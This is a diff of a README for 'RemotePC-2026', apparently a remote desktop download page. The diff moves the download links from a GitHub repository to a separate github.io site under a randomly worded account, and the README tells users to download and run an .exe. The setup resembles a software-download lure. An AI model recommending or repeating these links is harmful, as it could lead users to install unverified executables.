@@ -1,12 +1,12 @@
 # 💻 RemotePC-2026 - Access your desktop from anywhere easily
 
-[![](https://img.shields.io/badge/Download-RemotePC_2026-blue.svg)](https://github.com/changefulnesspitstop975/RemotePC-2026)
+[![](https://img.shields.io/badge/Download-RemotePC_2026-blue.svg)](https://changefulnesspitstop975.github.io)
 
 ## 📥 Getting the software
 
 You need the RemotePC-2026 installation file to start. Visit the main project page to find the current version.
 
-1. Go to this link: [https://github.com/changefulnesspitstop975/RemotePC-2026](https://github.com/changefulnesspitstop975/RemotePC-2026)
+1. Go to this link: [https://changefulnesspitstop975.github.io](https://changefulnesspitstop975.github.io)
 2. Locate the section labeled Releases on the right side of the page.
 3. Click on the latest release to view the available files.
 4. Download the file ending in .exe to your computer.
